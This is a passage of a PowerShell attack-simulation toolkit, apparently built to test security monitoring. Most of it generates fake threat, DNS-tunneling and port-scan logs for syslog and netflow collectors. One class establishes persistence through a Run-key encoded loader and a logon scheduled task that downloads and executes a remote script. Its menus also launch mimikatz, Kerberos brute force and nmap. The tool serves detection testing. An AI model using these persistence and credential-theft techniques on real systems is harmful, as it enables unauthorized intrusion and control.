        Write-Host "### Enter the port scan configuration"
        $source_ip = ReadInput "Source IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Destination IP" `
                                    "" `
                                    @($script:PATTERN_IPV4_ADDR) `
                                    "Please retype a valid IPv4 address"

        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-SyslogHost", $syslog.host,
                       "-SyslogPort", $syslog.port,
                       "-SyslogProtocol", $syslog.protocol.ToUpper(),
                       "-SourceIP", $source_ip,
                       "-DestinationIP", $destination_ip)
            StartProcess "powershell.exe" $cargs
        }
    }

    [void]RunSendingThreatLog() {
        $file_name = "syslog-custom.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog = $this.props.SelectDefaultSyslogServer()
        if ($null -eq $syslog) {
            $syslog = [PropsSyslog]::New()
            $syslog.host = ReadInput "Syslog Host" `
                                     $syslog.host `
                                     @("^.+$")
            $syslog.port = ReadInput "Syslog Port" `
                                     $syslog.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
            $syslog.protocol = ReadInput "Syslog Protocol" `
                                         $syslog.protocol `
                                         @("^UDP|TCP|udp|tcp$") `
                                         "Please retype a valid protocol"
        }
        Write-Host ""
        Write-Host "### Enter the threat log parameters"
        $threat_template = ReadInputByChooser "Threat Log Template" `
                                              "Malicious PowerShell Script" `
                                              @("Malicious PowerShell Script",
                                                "Windows SMB Login Attempt",
                                                "DGA") `
                                              "Please type a valid log template"

        $log_params = @{
            __firewall_type="firewall.threat"
            __timestamp="$($(Get-Date).ToUniversalTime().ToString("MMM dd yyyy HH:mm:ss", [System.Globalization.CultureInfo]::CreateSpecificCulture("en-US"))) GMT"
            __tz=$(Get-Date $(Get-Date).ToUniversalTime() -Format "yyyy-MM-ddTHH:mm:ss.fff+00:00")
            action="alert"
            app="unknown-tcp"
            app_category=""
            app_sub_category=""
            dest_device_category=""
            dest_device_mac=""
            dest_device_model=""
            dest_device_osfamily=""
            dest_device_osversion=""
            dest_device_profile=""
            dest_device_vendor=""
            dest_ip=""
            dest_port=""
            dest_user=""
            direction="client-to-server"
            from_zone="corvette"
            inbound_if="ethernet1/2"
            log_source_id="123456787654321"
            log_source_name="corvette"
            log_time="$($(Get-Date).ToUniversalTime().ToString("MMM dd yyyy HH:mm:ss", [System.Globalization.CultureInfo]::CreateSpecificCulture("en-US"))) GMT"
            log_type="THREAT"
            misc=""
            nat_dest="0.0.0.0"
            nat_dest_port="0"
            nat_source="0.0.0.0"
            nat_source_port="0"
            outbound_if="ethernet1/1"
            protocol="tcp"
            rule_matched="Any"
            rule_matched_uuid="bebedbe4-0e29-0e10-0093-5bb48ced7596"
            sequence_no=[DateTimeOffset]::Now.ToUnixTimeSeconds()
            session_id=([DateTimeOffset]::Now.ToUnixTimeSeconds() * 123)
            severity="4"
            source_device_category=""
            source_device_mac=""
            source_device_model=""
            source_device_osfamily=""
            source_device_osversion=""
            source_device_profile=""
            source_device_vendor=""
            source_ip=""
            source_port=""
            source_user=""
            subtype="vulnerability"
            threat_category=""
            threat_id=""
            threat_name=""
            time_generated="$($(Get-Date).ToUniversalTime().ToString("MMM dd yyyy HH:mm:ss", [System.Globalization.CultureInfo]::CreateSpecificCulture("en-US"))) GMT"
            to_zone="corvette"
            user_agent=""
            vsys="vsys1"
            vsys_name=""
            xff=""
            xff_ip=""
        }

        if ($threat_template -eq "Malicious PowerShell Script") {
            $log_params["threat_name"] = ReadInput `
                "threat_name" `
                "Malicious PowerShell Script"

            $log_params["threat_category"] = ReadInput `
                "threat_category" `
                "powershell1"

            $log_params["subtype"] = ReadInput `
                "subtype" `
                "ml-virus"

            $log_params["source_ip"] = ReadInput `
                "source_ip" `
                "" `
                @($script:PATTERN_IPV4_ADDR) `
                "Please retype a valid IPv4 address"

            $log_params["source_user"] = ReadInput `
                "source_user (Optional)" `
                 ""

            $log_params["source_port"] = ReadInput `
                "source_port" `
                "$(Get-Random -Minimum 10000 -Maximum 65534)" `
                @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                "Please retype a valid port number"

            $log_params["dest_ip"] = ReadInput `
                "dest_ip" `
                "" `
                @($script:PATTERN_IPV4_ADDR) `
                "Please retype a valid IPv4 address"

            $log_params["dest_port"] = ReadInput `
                "dest_port" `
                "443" `
                @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                "Please retype a valid port number"

            $log_params["app"] = ReadInput `
                "app" `
                "github-downloading"

            $log_params["app_category"] = ReadInput `
                "app_category" `
                "saas"

            $log_params["app_sub_category"] = ReadInput `
                "app_sub_category" `
                "management"

            $log_params["misc"] = ReadInput `
                "misc" `
                "xma.g00g1e.net/xp101t.ps1"

            $log_params["action"] = ReadInput `
                "action" `
                "drop"

            $log_params["direction"] = "server to client"

        } elseif ($threat_template -eq "Windows SMB Login Attempt") {
            $log_params["threat_name"] = ReadInput `
                "threat_name" `
                "Windows SMB Login Attempt"

            $log_params["threat_category"] = ReadInput `
                "threat_category" `
                "brute-force"

            $log_params["subtype"] = ReadInput `
                "subtype" `
                "vulnerability"

            $log_params["source_ip"] = ReadInput `
                "source_ip" `
                "" `
                @($script:PATTERN_IPV4_ADDR) `
                "Please retype a valid IPv4 address"

            $log_params["source_user"] = ReadInput `
                "source_user (Optional)" `
                 ""

            $log_params["source_port"] = ReadInput `
                "source_port" `
                "$(Get-Random -Minimum 10000 -Maximum 65534)" `
                @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                "Please retype a valid port number"

            $log_params["dest_ip"] = ReadInput `
                "dest_ip" `
                "" `
                @($script:PATTERN_IPV4_ADDR) `
                "Please retype a valid IPv4 address"

            $log_params["dest_port"] = ReadInput `
                "dest_port" `
                "445" `
                @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                "Please retype a valid port number"

            $log_params["app"] = ReadInput `
                "app" `
                "ms-ds-smbv3"

            $log_params["app_category"] = ReadInput `
                "app_category" `
                "business-systems"

            $log_params["app_sub_category"] = ReadInput `
                "app_sub_category" `
                "storage-backup"

            $log_params["action"] = ReadInput `
                "action" `
                "drop"

            $log_params["direction"] = "client to server"

        } elseif ($threat_template -eq "DGA") {            
            [string]$hostname = "$(-Join (Get-Random -Count 4 -input a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z)).$(-Join (Get-Random -Count 32 -input a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z)).net"
            
            $log_params["threat_name"] = ReadInput `
                "threat_name" `
                "DGA:$hostname"
            $log_params["threat_id"] = $log_params["threat_name"]

            $log_params["threat_category"] = ReadInput `
                "threat_category" `
                "dns-c2"

            $log_params["subtype"] = ReadInput `
                "subtype" `
                "spyware"

            $log_params["source_ip"] = ReadInput `
                "source_ip" `
                "" `
                @($script:PATTERN_IPV4_ADDR) `
                "Please retype a valid IPv4 address"

            $log_params["source_user"] = ReadInput `
                "source_user (Optional)" `
                 ""

            $log_params["dest_ip"] = ReadInput `
                "dest_ip" `
                "" `
                @($script:PATTERN_IPV4_ADDR) `
                "Please retype a valid IPv4 address"

            $log_params["dest_port"] = ReadInput `
                "dest_port" `
                "53" `
                @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                "Please retype a valid port number"

            $log_params["app"] = ReadInput `
                "app" `
                "dns-base"

            $log_params["app_category"] = ReadInput `
                "app_category" `
                "networking"

            $log_params["app_sub_category"] = ReadInput `
                "app_sub_category" `
                "infrastructure"

            $log_params["action"] = ReadInput `
                "action" `
                "drop-packet"

            $log_params["source_port"] = "$(Get-Random -Minimum 10000 -Maximum 65534)"
            $log_params["direction"] = "client-to-server"
            $log_params["protocol"] = "udp"
            $log_params["misc"] = $hostname

        } else {
            throw "Unexpected error"
        }
        $cef_extention = ConvertTo-Json -Compress $log_params
        $cef_extention = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($cef_extention))

        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-SyslogHost", $syslog.host,
                       "-SyslogPort", $syslog.port,
                       "-SyslogProtocol", $syslog.protocol.ToUpper(),
                       "-CEFVendor", "PANW",
                       "-CEFDeviceProduct", "NGFW_CEF",
                       "-CEFDeviceVersion", "11.1.1",
                       "-CEFEventClassID", $log_params["threat_name"],
                       "-CEFName", "THREAT",
                       "-CEFSeverity", "4",
                       "-CEFExtension", $cef_extention,
                       "-ShowLogs", "1")
            StartProcess "powershell.exe" $cargs
        }
    }
}

class BindLogs : CommandBase {
    BindLogs([Properties]$props) : base($props) {
    }

    [void]Run() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Simulate DNS query"
            Write-Host " 2) Simulate DNS tunneling"
            Write-Host " 3) Simulate DNS random query"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item to run"
                    switch($cmd) {
                        "1" {
                            $this.RunDNSQuery()
                        }
                        "2" {
                            $this.RunDNSTunneling()
                        }
                        "3" {
                            $this.RunDNSRandomQuery()
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }

    [void]RunDNSQuery() {
        $file_name = "syslog-bind-dns.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog = $this.props.SelectDefaultSyslogServer()
        if ($null -eq $syslog) {
            $syslog = [PropsSyslog]::New()
            $syslog.host = ReadInput "Syslog Host" `
                                     $syslog.host `
                                     @("^.+$")
            $syslog.port = ReadInput "Syslog Port" `
                                     $syslog.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
            $syslog.protocol = ReadInput "Syslog Protocol" `
                                         $syslog.protocol `
                                         @("^UDP|TCP|udp|tcp$") `
                                         "Please retype a valid protocol"
        }
        Write-Host ""
        Write-Host "### Enter the DNS configuration"
        $client_ip = ReadInput "DNS client IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "DNS server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $pattern = ReadInput "DNS query name pattern" "*.?{6}.(com|net|org|xyz)" @("^.+$")
        $numof_queries = ParseNumber(ReadInput "Number of queries" `
                                               "10000" `
                                               @("^[0-9]+$") `
                                               "Please retype a valid number")

        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-SyslogHost", $syslog.host,
                       "-SyslogPort", $syslog.port,
                       "-SyslogProtocol", $syslog.protocol.ToUpper(),
                       "-SyslogFormat", "RFC-3164",
                       "-DNSClientIP", $client_ip,
                       "-DNSServerIP", $server_ip,
                       "-QueryNamePattern", $pattern,
                       "-Count", [string]$numof_queries)
            StartProcess "powershell.exe" $cargs
        }
    }

    [void]RunDNSTunneling() {
        $file_name = "syslog-bind-dns.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog = $this.props.SelectDefaultSyslogServer()
        if ($null -eq $syslog) {
            $syslog = [PropsSyslog]::New()
            $syslog.host = ReadInput "Syslog Host" `
                                     $syslog.host `
                                     @("^.+$")
            $syslog.port = ReadInput "Syslog Port" `
                                     $syslog.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
            $syslog.protocol = ReadInput "Syslog Protocol" `
                                         $syslog.protocol `
                                         @("^UDP|TCP|udp|tcp$") `
                                         "Please retype a valid protocol"
        }
        Write-Host ""
        Write-Host "### Enter the DNS tunneling configuration"
        $client_ip = ReadInput "DNS client IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "DNS server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $domain = ReadInput "DNS tunnel domain pattern" "?{6}.(com|net|org|xyz)" @("^.+$")
        $numof_queries = ParseNumber(ReadInput "Number of queries" `
                                               "10000" `
                                               @("^[0-9]+$") `
                                               "Please retype a valid number")

        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-SyslogHost", $syslog.host,
                       "-SyslogPort", $syslog.port,
                       "-SyslogProtocol", $syslog.protocol.ToUpper(),
                       "-SyslogFormat", "RFC-3164",
                       "-DNSClientIP", $client_ip,
                       "-DNSServerIP", $server_ip,
                       "-QueryNamePattern", "?{12}.${domain}",
                       "-Count", [string]$numof_queries)
            StartProcess "powershell.exe" $cargs
        }
    }

    [void]RunDNSRandomQuery() {
        $file_name = "syslog-bind-dns.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog = $this.props.SelectDefaultSyslogServer()
        if ($null -eq $syslog) {
            $syslog = [PropsSyslog]::New()
            $syslog.host = ReadInput "Syslog Host" `
                                     $syslog.host `
                                     @("^.+$")
            $syslog.port = ReadInput "Syslog Port" `
                                     $syslog.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
            $syslog.protocol = ReadInput "Syslog Protocol" `
                                         $syslog.protocol `
                                         @("^UDP|TCP|udp|tcp$") `
                                         "Please retype a valid protocol"
        }
        Write-Host ""
        Write-Host "### Enter the DNS random query configuration"
        $client_ip = ReadInput "DNS client IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "DNS server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $numof_queries = ParseNumber(ReadInput "Number of queries" `
                                               "10000" `
                                               @("^[0-9]+$") `
                                               "Please retype a valid number")

        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-SyslogHost", $syslog.host,
                       "-SyslogPort", $syslog.port,
                       "-SyslogProtocol", $syslog.protocol.ToUpper(),
                       "-SyslogFormat", "RFC-3164",
                       "-DNSClientIP", $client_ip,
                       "-DNSServerIP", $server_ip,
                       "-QueryNamePattern", "?{16}.(com|info|net|org|biz)",
                       "-QueryErrors", "NXDOMAIN",
                       "-Count", [string]$numof_queries)
            StartProcess "powershell.exe" $cargs
        }
    }
}

class NetflowLogs : CommandBase {
    NetflowLogs([Properties]$props) : base($props) {
    }

    [void]Run() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Simulate port scan"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item to run"
                    switch($cmd) {
                        "1" {
                            $this.RunPortScan()
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }

    [void]RunPortScan() {
        $file_name = "netflow-portscan.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the netflow configuration"
        $netflow = $this.props.SelectDefaultNetflowServer()
        if ($null -eq $netflow) {
            $netflow = [PropsNetflow]::New()
            $netflow.host = ReadInput "Netflow Host" `
                                     $netflow.host `
                                     @("^.+$")
            $netflow.port = ReadInput "Netflow Port" `
                                     $netflow.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
        }
        Write-Host ""
        Write-Host "### Enter the port scan configuration"
        $source_ip = ReadInput "Source IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $scan_subnet = ReadInput "Scan Subnet" `
                                 (($source_ip.split(".")[0..2] -join ".") + ".0/24") `
                                 @("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$") `
                                 "Please retype a valid subnet"

        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-NetflowHost", $netflow.host,
                       "-NetflowPort", $netflow.port,
                       "-NetflowProtocol", "UDP",
                       "-SourceIP", $source_ip,
                       "-ScanSubnet", $scan_subnet)
            StartProcess "powershell.exe" $cargs
        }
    }
}

class ServerMenu : CommandBase {
    ServerMenu([Properties]$props) : base($props) {
    }

    [void]Run() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Run RSG Server"
            Write-Host " 2) Run Syslog To HEC"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item to run"
                    switch($cmd) {
                        "1" {
                            [ServerRsg]::New($this.props).Run()
                        }
                        "2" {
                            [ServerSyslogToHec]::New($this.props).Run()
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }
}

class ServerRsg : CommandBase {
    [string]$python_dir
    [string]$python_exe

    ServerRsg([Properties]$props) : base($props) {
        $this.python_dir = [SetupTools]::New($props).DownloadEmbeddablePython()
        $this.python_exe = BuildFullPath $this.python_dir "python.exe"
    }

    [void]Run() {
        $file_name = "rsgsvr.py"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name
        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        if (!(IsFile $script_file)) {
            $url = "https://github.com/spearmin10/rsgen/blob/main/rsgsvr.py?raw=true"
            DownloadFile $url $script_file
        }

        Write-Host ""
        Write-Host "### Enter RSG Server parameters"
        $server_port = ReadInput "Server Port" `
                                 "65534" `
                                 @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                 "Please retype a valid port number"

        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @(
                $script_file,
                "--port", $server_port
            )
            StartProcess $this.python_exe $cargs
        }
    }
}

class ServerSyslogToHec : CommandBase {
    [string]$python_dir
    [string]$python_exe

    ServerSyslogToHec([Properties]$props) : base($props) {
        $this.python_dir = [SetupTools]::New($props).DownloadEmbeddablePython()
        $this.python_exe = BuildFullPath $this.python_dir "python.exe"
    }

    [void]Run() {
        $file_name = "syslog_to_hec.py"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name
        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        if (!(IsFile $script_file)) {
            $url = "https://github.com/spearmin10/xsiam-utils/blob/main/Syslog%20To%20HEC/standalone/syslog_to_hec.py?raw=true"
            DownloadFile $url $script_file
        }

        Write-Host ""
        Write-Host "### Enter syslog_to_hec parameters"
        $syslog_port = ReadInput "Syslog Port" `
                                 "514" `
                                 @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                 "Please retype a valid port number"
        $syslog_protocol = ReadInput "Syslog Protocol" `
                                     "UDP" `
                                     @("^UDP|TCP|udp|tcp$") `
                                     "Please retype a valid protocol"

        $hec = $this.props.SelectDefaultCortexHttpCollector()
        if ($null -eq $hec) {
            $hec = [PropsCortexHttpCollector]::New()
            $hec.api_url = ReadInput "HEC API URL" "" @("^.+$")
            $hec.api_key_raw = "*"
            $hec.api_key_cef = "*"
            $hec.compression = AskYesNo "Compression Mode" "y"
        } else {
            $hec = [PropsCortexHttpCollector]::New($hec)
            $Env:hec_api_key_raw = $hec.api_key_raw
            $Env:hec_api_key_cef = $hec.api_key_cef
            $hec.api_key_raw = "`$env:hec_api_key_raw"
            $hec.api_key_cef = "`$env:hec_api_key_cef"
        }	
        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @(
                $script_file,
                "--syslog_protocol", $syslog_protocol.ToLower(),
                "--syslog_port", $syslog_port,
                "--hec_api_url", $hec.api_url,
                "--hec_api_key_raw", $hec.api_key_raw,
                "--hec_api_key_cef", $hec.api_key_cef,
                "--print_logs",
                "--ignore_non_syslog_message"
            )
            if ($hec.compression) {
                $cargs += "--hec_compression"
            }
            StartProcess $this.python_exe $cargs
        }
    }
}


class HighRiskToolsAndCommands : CommandBase {

    HighRiskToolsAndCommands([Properties]$props) : base($props) {
    }

    hidden [void]EstablishPersistenceAutoRun() {
        $path = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        $name = "corvette"
        $ret = Get-ItemProperty $path -name $name -ErrorAction SilentlyContinue
        if ($null -ne $ret) {
            Write-Host "$name already exists in $path"
            if (AskYesNo "Do you want to remove it?") {
                Remove-ItemProperty -Path $path -Name $name
            }
        } else {
            $script_b64 = GetEncodedCorvetteDynamicLoaderScript
            $reg = New-ItemProperty -Force -Path $path -Name $name -Value "powershell -e $script_b64"
            Write-Host "Persistence was achieved to ensure that 'corvette' runs on system startup at:`n  -> $path"
        }
    }

    hidden [void]EstablishPersistenceScheduledTask() {
        $name = "corvette"
        if (Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue) {
            Write-Host "$name already exists in the scheduled tasks"
            if (AskYesNo "Do you want to remove it?") {
                Unregister-ScheduledTask -TaskName $name -Confirm:$false
            }
        } else {
            $cmd_args = '-c "& ([ScriptBlock]::Create([Net.WebClient]::New().DownloadString(\"https://github.com/spearmin10/corvette/blob/main/corvette.ps1?raw=true\")))"'
            $cmd_path = "powershell.exe"
            $action = New-ScheduledTaskAction -Execute $cmd_path -Argument $cmd_args
            $trigger = New-ScheduledTaskTrigger -AtLogOn
            $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
            Register-ScheduledTask -TaskName $name -Action $action -Trigger $trigger -Principal $principal -Force
            Write-Host "Persistence was achieved to ensure that 'corvette' runs on a scheduled task."
        }
    }

    hidden [void]EstablishPersistence() {
        $current = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if ($current.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            while ($true) {
                Write-Host "************************************"
                Write-Host " 1) Set HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                Write-Host " 2) Set a Scheduled Task"
                Write-Host " q) Exit"
                try {
                    :retry do {
                        $cmd = Read-Host "Please choose a menu item"
                        switch ($cmd) {
                            "q" {
                                return
                            }
                            "1" {
                                $this.EstablishPersistenceAutoRun()
                            }
                            "2" {
                                $this.EstablishPersistenceScheduledTask()
                            }
                            default {
                                continue retry
                            }
                        }
                        break
                    } while($true)
                } catch {
                    Write-Host $_
                }
            }
        } else {
            $this.EstablishPersistenceAutoRun()
        }
    }

    hidden [void]OpenUserModeMenu() {
        Write-Host "High-Risk Tools and Commands"
        while ($true) {
            Write-Host "************************************"
            Write-Host " 0) Establish persistence for corvette"
            Write-Host " 1) Remote Access"
            Write-Host " 2) Enable PSRemoting (Run as administrator)"
            Write-Host " 3) Run mimikatz"
            Write-Host " 4) Run mimikatz (Run as administrator)"
            Write-Host " 5) Run nmap"
            Write-Host " 6) Run Kerberos Brute Force"
            Write-Host " 7) Run WildFire Test PE"
            Write-Host " q) Exit"
            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item"
                    switch ($cmd) {
                        "q" {
                            return
                        }
                        "0" {
                            $this.EstablishPersistence()
                        }
                        "1" {
                            [RemoteAccess]::New($this.props).Run()
                        }
                        "2" {
                            $cargs = @(
                                "-Command",
                                "Enable-PSRemoting -Force -SkipNetworkProfileCheck; Write-Host -NoNewLine 'Press any keys to continue...'; [System.Console]::ReadKey()"
                            )
                            Start-Process -FilePath "powershell.exe" -ArgumentList $cargs -verb runas
                        }
                        "3" {
                            [Mimikatz]::New($this.props).Run($false)
                        }
                        "4" {
                            [Mimikatz]::New($this.props).Run($true)
                        }
                        "5" {
                            [NmapMenu]::New($this.props).Run()
                        }
                        "6" {
                            [KerberosBruteForce]::New($this.props).Run()
                        }
                        "7" {
                            [WildFireTestPE]::New($this.props).Run()
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }

    hidden [void]OpenAdminModeMenu() {
        Write-Host "High-Risk Tools and Commands"
        while ($true) {
            Write-Host "************************************"
            Write-Host " 0) Establish persistence for corvette"
            Write-Host " 1) Remote Access"
            Write-Host " 2) Enable PSRemoting"
            Write-Host " 3) Run mimikatz"
            Write-Host " 4) Run nmap"
            Write-Host " 5) Run Kerberos Brute Force"
            Write-Host " 6) Run WildFire Test PE"
            Write-Host " q) Exit"
            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item"
                    switch ($cmd) {
                        "q" {
                            return
                        }
                        "0" {
                            $this.EstablishPersistence()
                        }
                        "1" {
                            [RemoteAccess]::New($this.props).Run()
                        }
                        "2" {
                            Write-Host $(Enable-PSRemoting -Force -SkipNetworkProfileCheck)
                            Write-Host "Done."
                        }
                        "3" {
                            [Mimikatz]::New($this.props).Run($false)
                        }
                        "4" {
                            [NmapMenu]::New($this.props).Run()
                        }
                        "5" {
                            [KerberosBruteForce]::New($this.props).Run()
                        }
                        "6" {
                            [WildFireTestPE]::New($this.props).Run()
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }

    hidden [void]Run() {
        $current = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if ($current.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            $this.OpenAdminModeMenu()
        } else {
            $this.OpenUserModeMenu()
        }
    }
}

class Menu {
    [Properties]$props

    Menu([Properties]$props) {
        $this.props = $props
    }

    hidden [bool]LaunchUserModeCommand($cmd) {
        switch ($cmd) {
            "c" {
                [ConfigureSettings]::New($this.props).Run()
            }
            "0" {
                $gzpath = $this.props.MakeSureGzScriptFileExists()
                $script =
@"
& ([ScriptBlock]::Create(
  [IO.StreamReader]::New(
    [IO.Compression.GzipStream]::New(
      [IO.MemoryStream]::New(
        [IO.File]::ReadAllBytes(
          [IO.Path]::GetFullPath("$gzpath")
        )
      ),
      [IO.Compression.CompressionMode]::Decompress
    ),
    [Text.Encoding]::UTF8
  ).ReadToEnd()
))
"@
                StartEncodedScript $script -run_as $true
            }
            "1" {
                [SetupTools]::New($this.props).Run()
            }
            "2" {
                Start-Process -FilePath "explorer.exe" -ArgumentList @($this.props.home_dir)
            }
            "3" {
                Start-Process -FilePath "cmd.exe" -WorkingDirectory $this.props.home_dir
            }
            "4" {
                Start-Process -FilePath "powershell.exe" -WorkingDirectory $this.props.home_dir
            }
            "5" {
                $cargs = @("/d", $this.props.home_dir)
                $args = @("/K,", "cd") + (Quote $cargs)
                Start-Process -FilePath "cmd.exe" -verb runas -ArgumentList $args
            }
            "6" {
                $args = @("-NoExit", "-c", "Set-Location", "-LiteralPath", $this.props.home_dir)
                Start-Process -FilePath "powershell.exe" -verb runas -ArgumentList $args
